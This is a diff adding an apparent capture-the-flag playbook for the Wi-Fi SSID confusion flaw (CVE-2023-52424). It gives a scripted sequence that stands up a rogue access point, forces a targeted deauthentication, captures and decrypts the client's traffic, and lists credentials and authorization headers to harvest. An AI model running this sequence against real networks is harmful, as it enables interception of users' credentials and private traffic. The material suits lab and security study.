@@ -1,0 +1,85 @@
+# SSID Confusion flag — client thinks it's on X, is on Y
+
+CVE-2023-52424. The 4-way handshake doesn't authenticate the SSID.
+Client-side policy (VPN toggle, MDM profile, per-SSID trust) reads
+the wrong SSID string. Flag surface is whatever the client sends
+when it believes it's on the trusted network.
+
+## Recognition
+
+Prerequisite: two networks in the environment share a PSK. Recognize:
+
+- Multiple SSIDs, same beacon Vendor-IE fingerprint (same infra).
+- WPA2-PSK on both.
+- A client that shows evidence of per-SSID trust policy — probe
+  requests naming a "trusted" SSID + a "guest" SSID.
+
+## The one-shot sequence
+
+```python
+run_sequence([
+    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
+    {"action": "wait", "s": 15},
+    {"action": "recon_stop"},
+
+    # 1. Stand up the rogue on SSID Y (guest) with the same PSK as X (corp).
+    {"action": "hostapd_up",
+     "ssid": "GuestNet",
+     "channel": 6,
+     "wpa": 2,
+     "wpa_key_mgmt": "WPA-PSK",
+     "wpa_passphrase": "<shared PSK>"},
+
+    # 2. Push client off SSID X if PMF permits, else wait.
+    {"action": "deauth_targeted",
+     "bssid": "<real-corp-BSSID>",
+     "client": "11:22:33:44:55:66"},
+
+    # 3. Capture the client's traffic once it associates.
+    {"action": "capture_start",
+     "iface": "wlan1mon",
+     "channel": 6,
+     "out_path": "/tmp/ssidconf.pcapng"},
+
+    {"action": "wait", "s": 30},
+    {"action": "capture_stop"},
+
+    # 4. Decrypt with the shared PSK.
+    {"action": "wireshark_decrypt",
+     "pcap_path": "/tmp/ssidconf.pcapng",
+     "psk": "<shared PSK>",
+     "essid": "GuestNet"},
+])
+```
+
+## The flag surface
+
+- **Authorization header** the client sends assuming it's on Corp.
+- **MDM sync payload** — a device profile with credentials.
+- **Preference sync** — the client sends metadata it wouldn't send
+  on an untrusted network.
+- **VPN turn-off signal** — the client behaves as if the transport is
+  trusted; the flag is embedded in the traffic that a VPN would
+  otherwise have hidden.
+
+## What makes this hard to detect
+
+A WIDS sees "GuestNet" and "CorpWiFi" as normal APs. The confusion is
+at the client's higher-layer policy. From RF perspective the twin is
+clean — different SSID, different BSSID, correct handshake.
+
+## Failure modes
+
+- **PSKs differ.** Attack does not apply.
+- **Client validates BSSID + SSID against stored profile.** Some
+  2025+ Linux iwd builds do. Most iOS/Android don't (as of the 2024
+  paper).
+- **PMF-required on Corp AP.** Deauth can't push the client. Rely on
+  RSSI dominance — the rogue must be louder at the client than the
+  real corp AP.
+
+## Cite
+
+- attacks.json: `ssid-confusion-cve-2023-52424`.
+- Vanhoef & Yseboodt 2024.
+- cves.json: CVE-2023-52424.
